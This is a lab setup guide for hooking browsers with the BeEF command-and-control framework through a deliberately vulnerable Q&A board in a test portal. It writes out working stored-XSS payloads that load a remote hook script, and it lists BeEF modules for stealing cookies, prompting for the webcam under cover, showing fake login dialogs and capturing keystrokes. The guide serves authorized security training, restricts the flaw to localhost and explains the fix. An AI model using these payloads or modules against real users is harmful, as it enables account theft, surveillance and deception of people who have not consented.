# Lab Setup — myNorthgate + BeEF

Two things that are often confused:

| Piece | What it does |
|---|---|
| **BeEF** | Command-and-control server for hooked browsers. Doesn't inject anything on its own. |
| **The host page** | What delivers `hook.js` to the target browser. BeEF assumes you already solved this part. |

In this lab, the host page delivers the hook **only via stored XSS on
the Q&A board**. No `<script src=".../hook.js">` is embedded in the HTML.
You post a payload, and viewers of that post get hooked.

**Authorized lab only.** Your own machines/VMs or consented test users.

---

## 1 · Run BeEF (C2 server)

On your BeEF host (substitute `YOUR_BEEF_HOST` in the examples below with
that machine's address):

```bash
sudo apt install beef-xss && sudo beef-xss
# or
git clone https://github.com/beefproject/beef && cd beef && ./install && ./beef
```

Starts and prints:
- **Hook URL:** `http://YOUR_BEEF_HOST:3000/hook.js`
- **Panel URL:** `http://YOUR_BEEF_HOST:3000/ui/panel`

## 2 · Serve the portal

From the project folder, on any machine the target browser can reach:

```bash
python -m http.server 8000
```

Open `http://<server>:8000` in the test browser. Must be `localhost` /
`127.0.0.1` / `file://` for the Q&A board's unescaped rendering to kick
in; on any other hostname the board escapes posts and no payload will
execute.

---

## 3 · Inject via stored XSS → BeEF

1. In the portal, scroll to the **Student Q&A Board**.
2. In the **Ask a question** form, submit a title or body containing a
   payload, for example:

   ```html
   <script src="http://YOUR_BEEF_HOST:3000/hook.js"></script>
   ```

   or an event-handler payload like:

   ```html
   <img src=x onerror="var s=document.createElement('script');s.src='http://YOUR_BEEF_HOST:3000/hook.js';document.body.appendChild(s)">
   ```

3. The payload becomes a question on the board. **Any browser that
   loads the board** now runs the script → appears under **Online
   Browsers** in the BeEF panel.
4. In the BeEF panel, select the hooked browser → **Commands** →
   choose a module. Examples:
   - *Browser → Hooked Domain → Get Cookie*
   - *Browser → Webcam* (the `booth.html` page is natural cover for the
     camera prompt)
   - *Social Engineering → Pretty Theft* (fake login dialog; the
     myPortal sign-in panel reinforces it)
   - **Logs** tab shows typing captured on the hooked page — have the
     target type into the Q&A ask-form or the myPortal sign-in.

Why this is a real demo and not a trick: the page's render path is
doing exactly what a *vulnerable* backend would do — concatenating user
content into HTML without escaping. The fix a real app would ship is
to escape before rendering (what this project's public GitHub Pages
build does), or to use `textContent` instead of `innerHTML`.

---

## Gotchas

- **BeEF must be reachable** from the target browser (same network, no
  firewall on port 3000). If BeEF is down the payload still gets stored,
  but the `<script src>` fetch will 404 / time out and no hook lands.
- **CSP / CORS** aren't configured here, so the stored script "just
  works." A real site that sets a strict `Content-Security-Policy`
  would block an external `<script src>` even if an XSS existed.
- **Lab-mode gating** (`portal.js`) requires the host to be
  `localhost`, `127.0.0.1`, `file://` or a `*.localhost` / `*.local`
  address. On GitHub Pages or any other public hostname the board
  escapes everything and the injection won't execute.
- **Scope**: this is for an isolated lab. Don't point anything at
  browsers whose owners haven't consented.
